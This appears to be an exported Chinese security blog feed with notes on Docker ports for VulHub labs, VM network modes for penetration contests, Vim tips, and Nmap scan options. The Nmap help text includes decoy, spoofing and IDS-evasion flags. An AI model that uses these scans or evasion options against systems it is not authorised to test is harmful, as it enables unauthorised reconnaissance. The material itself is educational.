[image_new]:tag</span><br></pre></td></tr></table></figure><ol start="3"><li>使用新构镜像重起一个容器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name [Container_tag_new] -p 8081:80 [image_new]:tag</span><br></pre></td></tr></table></figure><p>注意！VulHub一些靶机服务,例如WordPress，在使用docker-compose时，是附带数据库服务的（MySQL和WP是两个容器），在当初构建容器的时候，已经规定好了服务的端口，此时再修改，会疯狂报错以及一堆问题。（需要多个容器运行的服务，还是直接修改docker-compose.yml就好)</p><h2 id="修改容器配置文件hostconfig-json"><a href="#修改容器配置文件hostconfig-json" class="headerlink" title="修改容器配置文件hostconfig.json"></a>修改容器配置文件hostconfig.json</h2><p>如果容器已经运行了呢？我们也可以通过修改容器对应的配置文件进行修改。<br>保险起见，先停止容器：<code>docker stop [Container_ID]</code><br>Linux中，容器的配置文件位置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;[Container_ID]&#x2F;hostconfig.json</span><br></pre></td></tr></table></figure><p>使用<code>sudo docker ps</code>命令查看容器ID，替换上述路径中的[Container_ID]，编辑修改hostconfig.json文件即可。  </p><blockquote><p>注意：docker路径需要root权限才能查看和修改，操作时可直接sudo su切换为root用户编辑，但要“注意安全”。</p></blockquote><p>但注意，最后，我们需要重启整个镜像服务，<code>systemctl restart docker</code>，这会影响到其他容器服务，不太推荐此方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 安全综合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么内网渗透要用NAT模式</title>
      <link href="/2019/12/06/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%A6%81%E7%94%A8NAT%E6%A8%A1%E5%BC%8F/"/>
      <url>/2019/12/06/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%A6%81%E7%94%A8NAT%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么内网渗透比赛时虚拟机要用NAT模式？"><a href="#为什么内网渗透比赛时虚拟机要用NAT模式？" class="headerlink" title="为什么内网渗透比赛时虚拟机要用NAT模式？"></a>为什么内网渗透比赛时虚拟机要用NAT模式？</h1><p>在学习了一点渗透的皮毛后，发现对计算机网络的了解很大程度上会帮助我们渗透摸清方向。而自己在学习计网时很多知识都遗忘或者没有掌握好（理论真的是内功心法，决定你的武功的高度），对比赛时的网络配置都不太了解，需要反思。<br>因此做了以下笔记，希望能帮助大家、帮助自己理解内网渗透（比赛）时的网络拓扑以及虚拟机网络配置问题。</p><h2 id="虚拟机三种网络模式（Bridged-NAT-Host-Only）"><a href="#虚拟机三种网络模式（Bridged-NAT-Host-Only）" class="headerlink" title="虚拟机三种网络模式（Bridged, NAT, Host Only）"></a>虚拟机三种网络模式（Bridged, NAT, Host Only）</h2><h3 id="1-Bridged（桥接）"><a href="#1-Bridged（桥接）" class="headerlink" title="1. Bridged（桥接）"></a>1. Bridged（桥接）</h3><blockquote><p>桥接网络是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。</p><p>类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。</p></blockquote><p>简单来说，桥接网络就是通过虚拟网卡，把虚拟机放到宿主机的局域网网络内，将其视为一个独立的，真实存在的局域网主机。因此该局域网内的主机和虚拟机都可以互相访问。</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191206094309.png" alt="桥接模式的网络拓扑图"><br>图：桥接的网络拓扑图  </p><h4 id="⚠️注意"><a href="#⚠️注意" class="headerlink" title="⚠️注意"></a>⚠️注意</h4><ol><li>此时虚拟网卡和物理网卡（宿主机）在网络拓扑上处于同等地位。  </li><li>此时，虚拟机上的虚拟网卡连接到虚拟交换机。虚拟交换机通过虚拟网桥连接到主机物理网卡。此时，虚拟机的IP必须与主机在<strong>同一网段，且子网掩码、网关（Gateway）以及DNS也需要与主机保持一致。</strong>  </li></ol><h4 id="🎯与内网渗透相关的"><a href="#🎯与内网渗透相关的" class="headerlink" title="🎯与内网渗透相关的"></a>🎯与内网渗透相关的</h4><p>在做内网渗透时，主机网络经常需要进行手动设置（manual），此时，虚拟机如果要采用桥接的方式，则在虚拟机里要对注意中的网络配置进行再次的修改。</p><h3 id="2-NAT-Network-Address-Translation-网络地址转换"><a href="#2-NAT-Network-Address-Translation-网络地址转换" class="headerlink" title="2. NAT(Network Address Translation, 网络地址转换)"></a>2. NAT(Network Address Translation, 网络地址转换)</h3><blockquote><p>NAT模式中，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。<br>NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是虚拟机软件提供的一个虚拟网络。</p></blockquote><blockquote><p>虚拟机向外部网络发送的请求数据”包裹”，都会交由NAT网络适配器加上”特殊标记”并以主机的名义转发出去，外部网络返回的响应数据”包裹”，也是先由主机接收，然后交由NAT网络适配器根据”特殊标记”进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p></blockquote><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191206095303.png" alt="NAT模式的网络拓扑图"><br>图：NAT模式的网络拓扑图  </p><h4 id="⚠️注意："><a href="#⚠️注意：" class="headerlink" title="⚠️注意："></a>⚠️注意：</h4><ul><li>NAT由于是在一个虚拟网络里面的，所以虚拟机与局域网其他主机无法互相访问，<strong>但与宿主机互通</strong>。但也可设置端口转发，让外部网络的主机通过宿主机上建立的转发端口间接与虚拟机进行通信</li><li>从外部网络看，虚拟机和宿主机共享一个IP</li><li>虚拟机和宿主机使用同一个TCP/IP配置</li><li>虚拟机内部是一个独立的局域网络，由虚拟DHCP服务器提供，并且通过虚拟网络地址转换器直接连接到主机网卡</li></ul><h3 id="3-Host-Only（仅主机模式）"><a href="#3-Host-Only（仅主机模式）" class="headerlink" title="3. Host Only（仅主机模式）"></a>3. Host Only（仅主机模式）</h3><p>这个模式理解相对简单，仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建<strong>完全包含在主机中的专用网络</strong>。仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。无法连接外网。</p><h4 id="⚠️注意：-1"><a href="#⚠️注意：-1" class="headerlink" title="⚠️注意："></a>⚠️注意：</h4><ul><li>同一台主机上可以创建多个Host Only主机模式的<strong>虚拟网络</strong>，处于同一个Host Only虚拟网络中的虚拟机可以互相通信。如果它们处于不同的虚拟网络，则默认无法进行通信（可设置路由进行通信）。</li></ul><h4 id="4-自定义网络连接配置"><a href="#4-自定义网络连接配置" class="headerlink" title="4. 自定义网络连接配置"></a>4. 自定义网络连接配置</h4><p>利用虚拟机软件提供的虚拟网络连接组件，可以创建复杂的虚拟网络。</p><h4 id="一个形象的比喻"><a href="#一个形象的比喻" class="headerlink" title="一个形象的比喻"></a>一个形象的比喻</h4><blockquote><p>桥接模式的虚拟机，就像一个在路由器”民政局”那里”上过户口”的成年人，有自己单独的居住地址，虽然和主机住在同一个大院里，但好歹是有户口的人，可以大摇大摆地直接和外面通信。<br> NAT模式的虚拟机，纯粹就是一个没上过户口的黑户，路由器”民政局”根本不知道有这么个人，自然也不会主动和它通信。即使虚拟机偶尔要向外面发送点的信件，都得交给主机以主机的名义转发出去，主机还专门请了一位叫做NAT的老大爷来专门负责这些虚拟机的发信、收信事宜。<br>仅主机模式的虚拟机，纯粹是一个彻彻底底的黑奴，不仅没有户口、路由器”民政局”不知道这么号人，还被主机关在小黑屋里，连信件也不准往外发。</p></blockquote><h2 id="为什么优先用NAT"><a href="#为什么优先用NAT" class="headerlink" title="为什么优先用NAT?"></a>为什么优先用NAT?</h2><p>介绍了以上几种虚拟机网络配置，那么我们在做内网渗透（比赛）时，为什么推荐用NAT呢？其实答案就在上面的⚠️注意 里面了：  </p><ol><li>桥接模式，虚拟机的IP必须与主机在<strong>同一网段，且子网掩码、网关（Gateway）以及DNS也需要与主机保持一致。</strong> 因此需要额外进行设置，且黑盒情况网络状况检查比较困难。而NAT模式，从外部网络看，虚拟机和宿主机共享一个IP，且其使用同一个TCP/IP配置。因此虚拟机使用NAT模式时，主机做好网络配置后，就不需要再在虚拟机里进行设置。</li><li>因为从外部网络看，虚拟机和宿主机共享一个IP，有时内网渗透比赛时，🎯<strong>标靶可能对客户机IP做了防火墙限制</strong>，此时使用桥接模式无法很好进行</li><li>Host Only模式，必须要主机都在同一<strong>虚拟网络</strong>里才能进行</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://zhuanlan.zhihu.com/p/56658358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/56658358</a><br><a href="https://www.cnblogs.com/xuliangxing/p/7027124.html" target="_blank" rel="noopener">https://www.cnblogs.com/xuliangxing/p/7027124.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【Note】为什么内网渗透比赛时虚拟机要用NAT模式？</title>
      <link href="/2019/12/06//articles/2019/12/06/1575615990696.html/"/>
      <url>/2019/12/06//articles/2019/12/06/1575615990696.html/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么内网渗透比赛时虚拟机要用NAT模式？"><a href="#为什么内网渗透比赛时虚拟机要用NAT模式？" class="headerlink" title="为什么内网渗透比赛时虚拟机要用NAT模式？"></a>为什么内网渗透比赛时虚拟机要用NAT模式？</h1><p>在学习了一点渗透的皮毛后，发现对计算机网络的了解很大程度上会帮助我们渗透摸清方向。而自己在学习计网时很多知识都遗忘或者没有掌握好（理论真的是内功心法，决定你的武功的高度），对比赛时的网络配置都不太了解，需要反思。<br>因此做了以下笔记，希望能帮助大家、帮助自己理解内网渗透（比赛）时的网络拓扑以及虚拟机网络配置问题。</p><h2 id="虚拟机三种网络模式（Bridged-NAT-Host-Only）"><a href="#虚拟机三种网络模式（Bridged-NAT-Host-Only）" class="headerlink" title="虚拟机三种网络模式（Bridged, NAT, Host Only）"></a>虚拟机三种网络模式（Bridged, NAT, Host Only）</h2><h3 id="1-Bridged（桥接）"><a href="#1-Bridged（桥接）" class="headerlink" title="1. Bridged（桥接）"></a>1. Bridged（桥接）</h3><blockquote><p>桥接网络是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。</p><p>类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。</p></blockquote><p>简单来说，桥接网络就是通过虚拟网卡，把虚拟机放到宿主机的局域网网络内，将其视为一个独立的，真实存在的局域网主机。因此该局域网内的主机和虚拟机都可以互相访问。</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191206094309.png" alt="桥接模式的网络拓扑图"><br>图：桥接的网络拓扑图  </p><h4 id="⚠️注意"><a href="#⚠️注意" class="headerlink" title="⚠️注意"></a>⚠️注意</h4><ol><li>此时虚拟网卡和物理网卡（宿主机）在网络拓扑上处于同等地位。  </li><li>此时，虚拟机上的虚拟网卡连接到虚拟交换机。虚拟交换机通过虚拟网桥连接到主机物理网卡。此时，虚拟机的IP必须与主机在<strong>同一网段，且子网掩码、网关（Gateway）以及DNS也需要与主机保持一致。</strong>  </li></ol><h4 id="🎯与内网渗透相关的"><a href="#🎯与内网渗透相关的" class="headerlink" title="🎯与内网渗透相关的"></a>🎯与内网渗透相关的</h4><p>在做内网渗透时，主机网络经常需要进行手动设置（manual），此时，虚拟机如果要采用桥接的方式，则在虚拟机里要对注意中的网络配置进行再次的修改。</p><h3 id="2-NAT-Network-Address-Translation-网络地址转换"><a href="#2-NAT-Network-Address-Translation-网络地址转换" class="headerlink" title="2. NAT(Network Address Translation, 网络地址转换)"></a>2. NAT(Network Address Translation, 网络地址转换)</h3><blockquote><p>NAT模式中，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。<br>NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是虚拟机软件提供的一个虚拟网络。</p></blockquote><blockquote><p>虚拟机向外部网络发送的请求数据”包裹”，都会交由NAT网络适配器加上”特殊标记”并以主机的名义转发出去，外部网络返回的响应数据”包裹”，也是先由主机接收，然后交由NAT网络适配器根据”特殊标记”进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p></blockquote><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191206095303.png" alt="NAT模式的网络拓扑图"><br>图：NAT模式的网络拓扑图  </p><h4 id="⚠️注意："><a href="#⚠️注意：" class="headerlink" title="⚠️注意："></a>⚠️注意：</h4><ul><li>NAT由于是在一个虚拟网络里面的，所以虚拟机与局域网其他主机无法互相访问，<strong>但与宿主机互通</strong>。但也可设置端口转发，让外部网络的主机通过宿主机上建立的转发端口间接与虚拟机进行通信</li><li>从外部网络看，虚拟机和宿主机共享一个IP</li><li>虚拟机和宿主机使用同一个TCP/IP配置</li><li>虚拟机内部是一个独立的局域网络，由虚拟DHCP服务器提供，并且通过虚拟网络地址转换器直接连接到主机网卡</li></ul><h3 id="3-Host-Only（仅主机模式）"><a href="#3-Host-Only（仅主机模式）" class="headerlink" title="3. Host Only（仅主机模式）"></a>3. Host Only（仅主机模式）</h3><p>这个模式理解相对简单，仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建<strong>完全包含在主机中的专用网络</strong>。仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。无法连接外网。</p><h4 id="⚠️注意：-1"><a href="#⚠️注意：-1" class="headerlink" title="⚠️注意："></a>⚠️注意：</h4><ul><li>同一台主机上可以创建多个Host Only主机模式的<strong>虚拟网络</strong>，处于同一个Host Only虚拟网络中的虚拟机可以互相通信。如果它们处于不同的虚拟网络，则默认无法进行通信（可设置路由进行通信）。</li></ul><h4 id="4-自定义网络连接配置"><a href="#4-自定义网络连接配置" class="headerlink" title="4. 自定义网络连接配置"></a>4. 自定义网络连接配置</h4><p>利用虚拟机软件提供的虚拟网络连接组件，可以创建复杂的虚拟网络。</p><h4 id="一个形象的比喻"><a href="#一个形象的比喻" class="headerlink" title="一个形象的比喻"></a>一个形象的比喻</h4><blockquote><p>桥接模式的虚拟机，就像一个在路由器”民政局”那里”上过户口”的成年人，有自己单独的居住地址，虽然和主机住在同一个大院里，但好歹是有户口的人，可以大摇大摆地直接和外面通信。<br> NAT模式的虚拟机，纯粹就是一个没上过户口的黑户，路由器”民政局”根本不知道有这么个人，自然也不会主动和它通信。即使虚拟机偶尔要向外面发送点的信件，都得交给主机以主机的名义转发出去，主机还专门请了一位叫做NAT的老大爷来专门负责这些虚拟机的发信、收信事宜。<br>仅主机模式的虚拟机，纯粹是一个彻彻底底的黑奴，不仅没有户口、路由器”民政局”不知道这么号人，还被主机关在小黑屋里，连信件也不准往外发。</p></blockquote><h2 id="为什么优先用NAT"><a href="#为什么优先用NAT" class="headerlink" title="为什么优先用NAT?"></a>为什么优先用NAT?</h2><p>介绍了以上几种虚拟机网络配置，那么我们在做内网渗透（比赛）时，为什么推荐用NAT呢？其实答案就在上面的⚠️注意 里面了：  </p><ol><li>桥接模式，虚拟机的IP必须与主机在<strong>同一网段，且子网掩码、网关（Gateway）以及DNS也需要与主机保持一致。</strong> 因此需要额外进行设置，且黑盒情况网络状况检查比较困难。而NAT模式，从外部网络看，虚拟机和宿主机共享一个IP，且其使用同一个TCP/IP配置。因此虚拟机使用NAT模式时，主机做好网络配置后，就不需要再在虚拟机里进行设置。</li><li>因为从外部网络看，虚拟机和宿主机共享一个IP，有时内网渗透比赛时，🎯<strong>标靶可能对客户机IP做了防火墙限制</strong>，此时使用桥接模式无法很好进行</li><li>Host Only模式，必须要主机都在同一<strong>虚拟网络</strong>里才能进行</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://zhuanlan.zhihu.com/p/56658358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/56658358</a><br><a href="https://www.cnblogs.com/xuliangxing/p/7027124.html" target="_blank" rel="noopener">https://www.cnblogs.com/xuliangxing/p/7027124.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 安全综合 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Note】Vim全选复制&amp;修改粘贴50行限制</title>
      <link href="/2019/12/02//articles/2019/12/02/1575275168127.html/"/>
      <url>/2019/12/02//articles/2019/12/02/1575275168127.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Vim全选复制-amp-修改粘贴50行限制"><a href="#Vim全选复制-amp-修改粘贴50行限制" class="headerlink" title="Vim全选复制&amp;修改粘贴50行限制"></a>Vim全选复制&amp;修改粘贴50行限制</h1><p>“几乎所有码农的一个共通点，记不住tar的解压和压缩命令”。<br>Vim平时不太会当作主力来用，没有仔细学习过，但最近更加爱上终端的操作了。遇到的这个问题记录一下——Vim的全选复制：</p><h2 id="全选复制"><a href="#全选复制" class="headerlink" title="全选复制"></a>全选复制</h2><ol><li>先esc切换到命令模式</li><li>键盘按 ggVGy，区分大小写</li></ol><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>gg</td><td>光标定位到文件首行</td></tr><tr><td>V</td><td>进入可视模式（可以不加）</td></tr><tr><td>G</td><td>跳转到文件末尾行</td></tr><tr><td>y</td><td>复制到0号寄存器，即系统粘贴板</td></tr></tbody></table><h2 id="突破Vim粘贴50行限制"><a href="#突破Vim粘贴50行限制" class="headerlink" title="突破Vim粘贴50行限制"></a>突破Vim粘贴50行限制</h2><p>类unix系统，Vim粘贴不能超过超过50行，以下是修改方法：</p><ol><li>在当前用户主目录<code>~</code>编辑<code>.vimrc</code>，没有则新建</li><li>在<code>~/.vimrc</code>文件中添加一行  <code>:set viminfo=&#39;1000,&lt;500</code><br>看后部分<br><code>&#39;</code>后的数字表示记住的最大的<a href="https://vimjc.com/vim-mark.html" target="_blank" rel="noopener">文件标记数</a><br><code>&lt;</code>厚度数字表示每个寄存器最大保存的行数，上面的命令也就是小于500行</li></ol><h3 id="💡补充"><a href="#💡补充" class="headerlink" title="💡补充"></a>💡补充</h3><p>vimrc文件是vim的环境设置文件，全局vim的设置在 <code>/etc/vimrc </code>文件中。但不建议修改<code>/etc/vimrc </code>文件，每个用户可以在用户根目录中设置vim，新建 <code>~/.vimrc</code>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试工具学习</title>
      <link href="/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试工具学习（一）"><a href="#渗透测试工具学习（一）" class="headerlink" title="渗透测试工具学习（一）"></a>渗透测试工具学习（一）</h1><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>《Metasploit渗透测试指南》<br><a href="https://xz.aliyun.com/t/2482" target="_blank" rel="noopener">https://xz.aliyun.com/t/2482</a>  </p><h2 id="1-Nmap"><a href="#1-Nmap" class="headerlink" title="1. Nmap"></a>1. Nmap</h2><h3 id="参数选择"><a href="#参数选择" class="headerlink" title="参数选择"></a>参数选择</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-sS 执行一次隐秘的svn握手包TCP&#x2F;IP扫描，判断端口是否存活 (s表示Stealth，隐秘)</span><br><span class="line">-sT 执行一次隐秘的TCP connect scan</span><br><span class="line">-Pn 不通过ping来预先判断主机是否存活，这点在公网扫描很重要，因为公网主机很多禁止ping来判断其存活性</span><br><span class="line">-A, to enable OS and version detection, script scanning, and traceroute</span><br><span class="line">-T4, for faster execution（外网尽量不要用，使用TCP连接使用T2比较合适）</span><br><span class="line">-sV, 识别服务指纹信息</span><br><span class="line">-O, 开启操作系统探测的扫描功能</span><br><span class="line">-F, Fast mode - Scan fewer ports than the default scan</span><br><span class="line">-oX fileName, 输出为一个</span><br><span class="line">-PO Treat all hosts as online -- skip host discover，即使用IP协议包的ping探测主机是否存活。</span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 识别主机信息</span></span><br><span class="line">&gt; nmap -sV -T4 -O -F --version-light xxxxxxxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取远程多个主机的系统类型及开放端口：  </span></span><br><span class="line">&gt; nmap -sS -P0 -sV -O 192.168.1.100-200</span><br></pre></td></tr></table></figure><h3 id="选项总览-线下备用"><a href="#选项总览-线下备用" class="headerlink" title="选项总览[线下备用]"></a>选项总览[线下备用]</h3><p>具体参考：<a href="https://zhuanlan.zhihu.com/p/25612351" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25612351</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com&#x2F;24, 192.168.0.1; 10.0-255.0-255.1-254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts&#x2F;networks</span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts&#x2F;networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -sL: List Scan - simply list targets to scan</span><br><span class="line">  -sP: Ping Scan - go no further than determining if host is online</span><br><span class="line">  -P0: Treat all hosts as online -- skip host discovery</span><br><span class="line">  -PS&#x2F;PA&#x2F;PU [portlist]: TCP SYN&#x2F;ACK or UDP discovery probes to given ports</span><br><span class="line">  -PE&#x2F;PP&#x2F;PM: ICMP echo, timestamp, and netmask request discovery probes</span><br><span class="line">  -n&#x2F;-R: Never do DNS resolution&#x2F;Always resolve [default: sometimes resolve]</span><br><span class="line">SCAN TECHNIQUES:</span><br><span class="line">  -sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon scans</span><br><span class="line">  -sN&#x2F;sF&#x2F;sX: TCP Null, FIN, and Xmas scans</span><br><span class="line">  --scanflags &lt;flags&gt;: Customize TCP scan flags</span><br><span class="line">  -sI &lt;zombie host[:probeport]&gt;: Idlescan</span><br><span class="line">  -sO: IP protocol scan</span><br><span class="line">  -b &lt;ftp relay host&gt;: FTP bounce scan</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER:</span><br><span class="line">  -p &lt;port ranges&gt;: Only scan specified ports</span><br><span class="line">    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080</span><br><span class="line">  -F: Fast - Scan only the ports listed in the nmap-services file)</span><br><span class="line">  -r: Scan ports consecutively - don&#39;t randomize</span><br><span class="line">SERVICE&#x2F;VERSION DETECTION:</span><br><span class="line">  -sV: Probe open ports to determine service&#x2F;version info</span><br><span class="line">  --version-light: Limit to most likely probes for faster identification</span><br><span class="line">  --version-all: Try every single probe for version detection</span><br><span class="line">  --version-trace: Show detailed version scan activity (for debugging)</span><br><span class="line">OS DETECTION:</span><br><span class="line">  -O: Enable OS detection</span><br><span class="line">  --osscan-limit: Limit OS detection to promising targets</span><br><span class="line">  --osscan-guess: Guess OS more aggressively</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  -T[0-6]: Set timing template (higher is faster)</span><br><span class="line">  --min-hostgroup&#x2F;max-hostgroup &lt;msec&gt;: Parallel host scan group sizes</span><br><span class="line">  --min-parallelism&#x2F;max-parallelism &lt;msec&gt;: Probe parallelization</span><br><span class="line">  --min-rtt-timeout&#x2F;max-rtt-timeout&#x2F;initial-rtt-timeout &lt;msec&gt;: Specifies</span><br><span class="line">      probe round trip time.</span><br><span class="line">  --host-timeout &lt;msec&gt;: Give up on target after this long</span><br><span class="line">  --scan-delay&#x2F;--max-scan-delay &lt;msec&gt;: Adjust delay between probes</span><br><span class="line">FIREWALL&#x2F;IDS EVASION AND SPOOFING:</span><br><span class="line">  -f; --mtu &lt;val&gt;: fragment packets (optionally w&#x2F;given MTU)</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys</span><br><span class="line">  -S &lt;IP_Address&gt;: Spoof source address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g&#x2F;--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --data-length &lt;num&gt;: Append random data to sent packets</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address, prefix, or vendor name&gt;: Spoof your MAC address</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;basename&gt;: Output in the three major formats at once</span><br><span class="line">  -v: Increase verbosity level (use twice for more effect)</span><br><span class="line">  -d[level]: Set or increase debugging level (Up to 9 is meaningful)</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (for debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">  --stylesheet &lt;path&#x2F;URL&gt;: XSL stylesheet to transform XML output to HTML</span><br><span class="line">  --no-stylesheet: Prevent Nmap from associating XSL stylesheet w&#x2F;XML output</span><br><span class="line">MISC:</span><br><span class="line">  -6: Enable IPv6 scanning</span><br><span class="line">  -A: Enables OS detection and Version detection</span><br><span class="line">  --datadir &lt;dirname&gt;: Specify custom Nmap data file location</span><br><span class="line">  --send-eth&#x2F;--send-ip: Send packets using raw ethernet frames or IP packets</span><br><span class="line">  --privileged: Assume that the user is fully privileged</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this help summary page.</span><br><span 